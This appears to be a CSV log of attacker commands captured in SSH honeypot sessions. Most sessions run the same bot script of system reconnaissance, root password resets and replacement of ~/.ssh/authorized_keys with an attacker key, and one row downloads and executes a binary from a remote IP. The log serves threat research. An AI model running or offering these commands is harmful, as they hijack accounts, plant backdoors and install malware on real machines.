,session,duration,command_freq,input
16370,d77c7c756625,15.632649183273315,15,cat /proc/cpuinfo | grep name | wc -l
16371,d77c7c756625,15.632649183273315,15,"echo ""root:4y9fuajli5Ky""|chpasswd|bash"
16372,d77c7c756625,15.632649183273315,15,"cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'"
16373,d77c7c756625,15.632649183273315,15,"free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'"
16374,d77c7c756625,15.632649183273315,15,ls -lh $(which ls)
16375,d77c7c756625,15.632649183273315,15,which ls
16376,d77c7c756625,15.632649183273315,15,crontab -l
16377,d77c7c756625,15.632649183273315,15,w
16378,d77c7c756625,15.632649183273315,15,uname -m
16379,d77c7c756625,15.632649183273315,15,cat /proc/cpuinfo | grep model | grep name | wc -l
16380,d77c7c756625,15.632649183273315,15,top
16381,d77c7c756625,15.632649183273315,15,uname
16382,d77c7c756625,15.632649183273315,15,uname -a
16383,d77c7c756625,15.632649183273315,15,lscpu | grep Model
16384,d77c7c756625,15.632649183273315,15,"cd ~ && rm -rf .ssh && mkdir .ssh && echo ""ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr"">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~"
16385,b0197db09d73,2.785913228988647,18,cat /proc/cpuinfo | grep name | wc -l
16386,b0197db09d73,2.785913228988647,18,"echo -e ""lai\nvdIzXUEhBQEH\nvdIzXUEhBQEH""|passwd|bash"
16387,b0197db09d73,2.785913228988647,18,Enter new UNIX password: 
16388,b0197db09d73,2.785913228988647,18,Enter new UNIX password:
16389,b0197db09d73,2.785913228988647,18,"echo ""lai\nvdIzXUEhBQEH\nvdIzXUEhBQEH\n""|passwd"
16390,b0197db09d73,2.785913228988647,18,"cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'"
16391,b0197db09d73,2.785913228988647,18,"free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'"
16392,b0197db09d73,2.785913228988647,18,ls -lh $(which ls)
16393,b0197db09d73,2.785913228988647,18,which ls
16394,b0197db09d73,2.785913228988647,18,crontab -l
16395,b0197db09d73,2.785913228988647,18,w
16396,b0197db09d73,2.785913228988647,18,uname -m
16397,b0197db09d73,2.785913228988647,18,cat /proc/cpuinfo | grep model | grep name | wc -l
16398,b0197db09d73,2.785913228988647,18,top
16399,b0197db09d73,2.785913228988647,18,uname
16400,b0197db09d73,2.785913228988647,18,uname -a
16401,b0197db09d73,2.785913228988647,18,lscpu | grep Model
16402,b0197db09d73,2.785913228988647,18,"cd ~ && rm -rf .ssh && mkdir .ssh && echo ""ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr"">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~"
16403,2fab245a796d,21.59992909431457,15,cat /proc/cpuinfo | grep name | wc -l
16404,2fab245a796d,21.59992909431457,15,"echo ""root:noyLoaOh34U4""|chpasswd|bash"
16405,2fab245a796d,21.59992909431457,15,"cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'"
16406,2fab245a796d,21.59992909431457,15,"free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'"
16407,2fab245a796d,21.59992909431457,15,ls -lh $(which ls)
16408,2fab245a796d,21.59992909431457,15,which ls
16409,2fab245a796d,21.59992909431457,15,crontab -l
16410,2fab245a796d,21.59992909431457,15,w
16411,2fab245a796d,21.59992909431457,15,uname -m
16412,2fab245a796d,21.59992909431457,15,cat /proc/cpuinfo | grep model | grep name | wc -l
16413,2fab245a796d,21.59992909431457,15,top
16414,2fab245a796d,21.59992909431457,15,uname
16415,2fab245a796d,21.59992909431457,15,uname -a
16416,2fab245a796d,21.59992909431457,15,lscpu | grep Model
16417,2fab245a796d,21.59992909431457,15,"cd ~ && rm -rf .ssh && mkdir .ssh && echo ""ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr"">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~"
16418,4b0090731509,16.127281427383423,18,cat /proc/cpuinfo | grep name | wc -l
16419,4b0090731509,16.127281427383423,18,"echo -e ""srvback\nuZp1L31KsWml\nuZp1L31KsWml""|passwd|bash"
16420,4b0090731509,16.127281427383423,18,Enter new UNIX password: 
16421,4b0090731509,16.127281427383423,18,Enter new UNIX password:
16422,4b0090731509,16.127281427383423,18,"echo ""srvback\nuZp1L31KsWml\nuZp1L31KsWml\n""|passwd"
16423,4b0090731509,16.127281427383423,18,"cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'"
16424,4b0090731509,16.127281427383423,18,"free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'"
16425,4b0090731509,16.127281427383423,18,ls -lh $(which ls)
16426,4b0090731509,16.127281427383423,18,which ls
16427,4b0090731509,16.127281427383423,18,crontab -l
16428,4b0090731509,16.127281427383423,18,w
16429,4b0090731509,16.127281427383423,18,uname -m
16430,4b0090731509,16.127281427383423,18,cat /proc/cpuinfo | grep model | grep name | wc -l
16431,4b0090731509,16.127281427383423,18,top
16432,4b0090731509,16.127281427383423,18,uname
16433,4b0090731509,16.127281427383423,18,uname -a
16434,4b0090731509,16.127281427383423,18,lscpu | grep Model
16435,4b0090731509,16.127281427383423,18,"cd ~ && rm -rf .ssh && mkdir .ssh && echo ""ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr"">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~"
16436,601b710f7ed6,11.224290370941162,15,cat /proc/cpuinfo | grep name | wc -l
16437,601b710f7ed6,11.224290370941162,15,"echo ""root:6pYl8X7I2IiV""|chpasswd|bash"
16438,601b710f7ed6,11.224290370941162,15,"cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'"
16439,601b710f7ed6,11.224290370941162,15,"free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'"
16440,601b710f7ed6,11.224290370941162,15,ls -lh $(which ls)
16441,601b710f7ed6,11.224290370941162,15,which ls
16442,601b710f7ed6,11.224290370941162,15,crontab -l
16443,601b710f7ed6,11.224290370941162,15,w
16444,601b710f7ed6,11.224290370941162,15,uname -m
16445,601b710f7ed6,11.224290370941162,15,cat /proc/cpuinfo | grep model | grep name | wc -l
16446,601b710f7ed6,11.224290370941162,15,top
16447,601b710f7ed6,11.224290370941162,15,uname
16448,601b710f7ed6,11.224290370941162,15,uname -a
16449,601b710f7ed6,11.224290370941162,15,lscpu | grep Model
16450,601b710f7ed6,11.224290370941162,15,"cd ~ && rm -rf .ssh && mkdir .ssh && echo ""ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr"">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~"
16451,6d14f17836a0,18.664523363113403,15,cat /proc/cpuinfo | grep name | wc -l
16452,6d14f17836a0,18.664523363113403,15,"echo ""root:nBrJhtNMs80H""|chpasswd|bash"
16453,6d14f17836a0,18.664523363113403,15,"cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'"
16454,6d14f17836a0,18.664523363113403,15,"free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'"
16455,6d14f17836a0,18.664523363113403,15,ls -lh $(which ls)
16456,6d14f17836a0,18.664523363113403,15,which ls
16457,6d14f17836a0,18.664523363113403,15,crontab -l
16458,6d14f17836a0,18.664523363113403,15,w
16459,6d14f17836a0,18.664523363113403,15,uname -m
16460,6d14f17836a0,18.664523363113403,15,cat /proc/cpuinfo | grep model | grep name | wc -l
16461,6d14f17836a0,18.664523363113403,15,top
16462,6d14f17836a0,18.664523363113403,15,uname
16463,6d14f17836a0,18.664523363113403,15,uname -a
16464,6d14f17836a0,18.664523363113403,15,lscpu | grep Model
16465,6d14f17836a0,18.664523363113403,15,"cd ~ && rm -rf .ssh && mkdir .ssh && echo ""ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr"">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~"
16466,94231d97353f,3.257922887802124,15,cat /proc/cpuinfo | grep name | wc -l
16467,94231d97353f,3.257922887802124,15,"echo ""root:fLspMK0c2pT9""|chpasswd|bash"
16468,94231d97353f,3.257922887802124,15,"cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'"
16469,94231d97353f,3.257922887802124,15,"free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'"
16470,94231d97353f,3.257922887802124,15,ls -lh $(which ls)
16471,94231d97353f,3.257922887802124,15,which ls
16472,94231d97353f,3.257922887802124,15,crontab -l
16473,94231d97353f,3.257922887802124,15,w
16474,94231d97353f,3.257922887802124,15,uname -m
16475,94231d97353f,3.257922887802124,15,cat /proc/cpuinfo | grep model | grep name | wc -l
16476,94231d97353f,3.257922887802124,15,top
16477,94231d97353f,3.257922887802124,15,uname
16478,94231d97353f,3.257922887802124,15,uname -a
16479,94231d97353f,3.257922887802124,15,lscpu | grep Model
16480,94231d97353f,3.257922887802124,15,"cd ~ && rm -rf .ssh && mkdir .ssh && echo ""ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr"">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~"
16481,dd0bb7958942,2.678566217422485,1,uname -s -m
16482,b88c29e779fb,78.64770317077637,15,cat /proc/cpuinfo | grep name | wc -l
16483,b88c29e779fb,78.64770317077637,15,"echo ""root:Bp4r1KOXjvHo""|chpasswd|bash"
16484,b88c29e779fb,78.64770317077637,15,"cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'"
16485,b88c29e779fb,78.64770317077637,15,"free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'"
16486,b88c29e779fb,78.64770317077637,15,ls -lh $(which ls)
16487,b88c29e779fb,78.64770317077637,15,which ls
16488,b88c29e779fb,78.64770317077637,15,crontab -l
16489,b88c29e779fb,78.64770317077637,15,w
16490,b88c29e779fb,78.64770317077637,15,uname -m
16491,b88c29e779fb,78.64770317077637,15,cat /proc/cpuinfo | grep model | grep name | wc -l
16492,b88c29e779fb,78.64770317077637,15,top
16493,b88c29e779fb,78.64770317077637,15,uname
16494,b88c29e779fb,78.64770317077637,15,uname -a
16495,b88c29e779fb,78.64770317077637,15,lscpu | grep Model
16496,b88c29e779fb,78.64770317077637,15,"cd ~ && rm -rf .ssh && mkdir .ssh && echo ""ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr"">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~"
16497,b7f40a99189e,87.59923720359802,18,cat /proc/cpuinfo | grep name | wc -l
16498,b7f40a99189e,87.59923720359802,18,"echo -e ""p4ssword\nPLzldXWNDLfT\nPLzldXWNDLfT""|passwd|bash"
16499,b7f40a99189e,87.59923720359802,18,Enter new UNIX password: 
16500,b7f40a99189e,87.59923720359802,18,Enter new UNIX password:
16501,b7f40a99189e,87.59923720359802,18,"echo ""p4ssword\nPLzldXWNDLfT\nPLzldXWNDLfT\n""|passwd"
16502,b7f40a99189e,87.59923720359802,18,"cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'"
16503,b7f40a99189e,87.59923720359802,18,"free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'"
16504,b7f40a99189e,87.59923720359802,18,ls -lh $(which ls)
16505,b7f40a99189e,87.59923720359802,18,which ls
16506,b7f40a99189e,87.59923720359802,18,crontab -l
16507,b7f40a99189e,87.59923720359802,18,w
16508,b7f40a99189e,87.59923720359802,18,uname -m
16509,b7f40a99189e,87.59923720359802,18,cat /proc/cpuinfo | grep model | grep name | wc -l
16510,b7f40a99189e,87.59923720359802,18,top
16511,b7f40a99189e,87.59923720359802,18,uname
16512,b7f40a99189e,87.59923720359802,18,uname -a
16513,b7f40a99189e,87.59923720359802,18,lscpu | grep Model
16514,b7f40a99189e,87.59923720359802,18,"cd ~ && rm -rf .ssh && mkdir .ssh && echo ""ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr"">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~"
16515,6f31550e0909,163.33838939666748,15,cat /proc/cpuinfo | grep name | wc -l
16516,d3fd0ab10e1f,155.9111270904541,17,cat /proc/cpuinfo | grep name | wc -l
16517,6f31550e0909,163.33838939666748,15,"echo ""root:I02A2WWOU5Ny""|chpasswd|bash"
16518,d3fd0ab10e1f,155.9111270904541,17,"echo -e ""3333\nO8UoggamlmLX\nO8UoggamlmLX""|passwd|bash"
16519,d3fd0ab10e1f,155.9111270904541,17,Enter new UNIX password: 
16520,d3fd0ab10e1f,155.9111270904541,17,Enter new UNIX password:
16521,6f31550e0909,163.33838939666748,15,"cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'"
16522,d3fd0ab10e1f,155.9111270904541,17,"echo ""3333\nO8UoggamlmLX\nO8UoggamlmLX\n""|passwd"
16523,6f31550e0909,163.33838939666748,15,"free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'"
16524,d3fd0ab10e1f,155.9111270904541,17,"cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'"
16525,6f31550e0909,163.33838939666748,15,ls -lh $(which ls)
16526,6f31550e0909,163.33838939666748,15,which ls
16527,d3fd0ab10e1f,155.9111270904541,17,"free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'"
16528,d3fd0ab10e1f,155.9111270904541,17,ls -lh $(which ls)
16529,d3fd0ab10e1f,155.9111270904541,17,which ls
16530,6f31550e0909,163.33838939666748,15,crontab -l
16531,d3fd0ab10e1f,155.9111270904541,17,crontab -l
16532,6f31550e0909,163.33838939666748,15,w
16533,d3fd0ab10e1f,155.9111270904541,17,w
16534,6f31550e0909,163.33838939666748,15,uname -m
16535,d3fd0ab10e1f,155.9111270904541,17,cat /proc/cpuinfo | grep model | grep name | wc -l
16536,6f31550e0909,163.33838939666748,15,cat /proc/cpuinfo | grep model | grep name | wc -l
16537,d3fd0ab10e1f,155.9111270904541,17,top
16538,d3fd0ab10e1f,155.9111270904541,17,uname
16539,d3fd0ab10e1f,155.9111270904541,17,uname -a
16540,6f31550e0909,163.33838939666748,15,top
16541,d3fd0ab10e1f,155.9111270904541,17,lscpu | grep Model
16542,d3fd0ab10e1f,155.9111270904541,17,"cd ~ && rm -rf .ssh && mkdir .ssh && echo ""ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr"">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~"
16543,6f31550e0909,163.33838939666748,15,uname
16544,6f31550e0909,163.33838939666748,15,uname -a
16545,6f31550e0909,163.33838939666748,15,lscpu | grep Model
16546,6f31550e0909,163.33838939666748,15,"cd ~ && rm -rf .ssh && mkdir .ssh && echo ""ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr"">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~"
16547,755b42896d6b,13.731807231903076,18,cat /proc/cpuinfo | grep name | wc -l
16548,755b42896d6b,13.731807231903076,18,"echo -e ""vod123\n8wErtYZF8lvo\n8wErtYZF8lvo""|passwd|bash"
16549,755b42896d6b,13.731807231903076,18,Enter new UNIX password: 
16550,755b42896d6b,13.731807231903076,18,Enter new UNIX password:
16551,755b42896d6b,13.731807231903076,18,"echo ""vod123\n8wErtYZF8lvo\n8wErtYZF8lvo\n""|passwd"
16552,755b42896d6b,13.731807231903076,18,"cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'"
16553,755b42896d6b,13.731807231903076,18,"free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'"
16554,755b42896d6b,13.731807231903076,18,ls -lh $(which ls)
16555,755b42896d6b,13.731807231903076,18,which ls
16556,755b42896d6b,13.731807231903076,18,crontab -l
16557,755b42896d6b,13.731807231903076,18,w
16558,755b42896d6b,13.731807231903076,18,uname -m
16559,755b42896d6b,13.731807231903076,18,cat /proc/cpuinfo | grep model | grep name | wc -l
16560,755b42896d6b,13.731807231903076,18,top
16561,755b42896d6b,13.731807231903076,18,uname
16562,755b42896d6b,13.731807231903076,18,uname -a
16563,755b42896d6b,13.731807231903076,18,lscpu | grep Model
16564,755b42896d6b,13.731807231903076,18,"cd ~ && rm -rf .ssh && mkdir .ssh && echo ""ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr"">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~"
16565,5d7de83ea98e,60.25380825996399,1,wget 23.94.22.13/x86_64; chmod 777 x86_64; ./x86_64 wns.x86
16566,1621af6be5ca,31.520493745803837,15,cat /proc/cpuinfo | grep name | wc -l
16567,1621af6be5ca,31.520493745803837,15,"echo ""root:hVFTY5tnaYhO""|chpasswd|bash"
16568,1621af6be5ca,31.520493745803837,15,"cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'"
16569,1621af6be5ca,31.520493745803837,15,"free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'"
16570,1621af6be5ca,31.520493745803837,15,ls -lh $(which ls)
16571,1621af6be5ca,31.520493745803837,15,which ls
16572,1621af6be5ca,31.520493745803837,15,crontab -l
16573,1621af6be5ca,31.520493745803837,15,w
16574,1621af6be5ca,31.520493745803837,15,uname -m
16575,1621af6be5ca,31.520493745803837,15,cat /proc/cpuinfo | grep model | grep name | wc -l
16576,1621af6be5ca,31.520493745803837,15,top
16577,1621af6be5ca,31.520493745803837,15,uname
16578,1621af6be5ca,31.520493745803837,15,uname -a
16579,1621af6be5ca,31.520493745803837,15,lscpu | grep Model
16580,1621af6be5ca,31.520493745803837,15,"cd ~ && rm -rf .ssh && mkdir .ssh && echo ""ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr"">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~"
16581,4854d23e3ba3,18.841652870178223,15,cat /proc/cpuinfo | grep name | wc -l
16582,4854d23e3ba3,18.841652870178223,15,"echo ""root:cmLCwxEon5mG""|chpasswd|bash"
16583,4854d23e3ba3,18.841652870178223,15,"cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'"
16584,4854d23e3ba3,18.841652870178223,15,"free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'"
16585,4854d23e3ba3,18.841652870178223,15,ls -lh $(which ls)
16586,4854d23e3ba3,18.841652870178223,15,which ls
16587,4854d23e3ba3,18.841652870178223,15,crontab -l
16588,4854d23e3ba3,18.841652870178223,15,w
16589,4854d23e3ba3,18.841652870178223,15,uname -m
16590,4854d23e3ba3,18.841652870178223,15,cat /proc/cpuinfo | grep model | grep name | wc -l
16591,4854d23e3ba3,18.841652870178223,15,top
16592,4854d23e3ba3,18.841652870178223,15,uname
